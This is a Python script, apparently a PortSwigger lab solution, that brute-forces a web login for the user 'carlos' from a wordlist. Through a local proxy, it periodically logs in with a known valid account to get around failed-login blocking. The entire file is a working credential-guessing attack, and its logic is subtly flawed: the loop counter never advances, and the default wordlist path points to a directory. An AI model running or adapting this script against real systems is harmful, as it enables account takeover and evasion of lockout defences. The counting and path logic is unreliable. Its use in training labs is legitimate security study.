import argparse
import requests as req
import urllib3

urllib3.disable_warnings()


def find_password(u, w, user_1, user_2, p):

    i = 0
    with open(w, "r") as password_file:
        passwords = password_file.readlines()

        for password in passwords:

            data_2 = {"username": user_2, "password": password.strip()}
            resp_2 = req.post(
                url=u, data=data_2, verify=False, allow_redirects=True, proxies=p
            )

            if len(resp_2.text) != 6230:
                return password.strip()
                break

            if (i % 4) == 0:
                data_1 = {"username": user_1, "password": "peter".strip()}
                resp_1 = req.post(url=u, data=data_1, verify=False, proxies=p)
                continue

            i = i + 1


if __name__ == "__main__":

    # Add argparse code to parse command-line arguments
    parser = argparse.ArgumentParser(description="Brute Force Login Form")
    parser.add_argument("--url", type=str, help="URL of the login form")
    parser.add_argument(
        "--wordlist",
        type=str,
        default="/home/kali/Documents/portswigger-academy/",
        help="Path to the wordlists directory",
    )
    args = parser.parse_args()

    URL = args.url
    PATH_TO_WORDLISTS = args.wordlist

    PROXIES = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080"}

    valid_user_1 = "wiener"
    valid_user_2 = "carlos"

    valid_password = find_password(
        URL, PATH_TO_WORDLISTS, valid_user_1, valid_user_2, PROXIES
    )
    print("[+] " + valid_password)

    print("[+] " + valid_user_2 + ":" + valid_password)

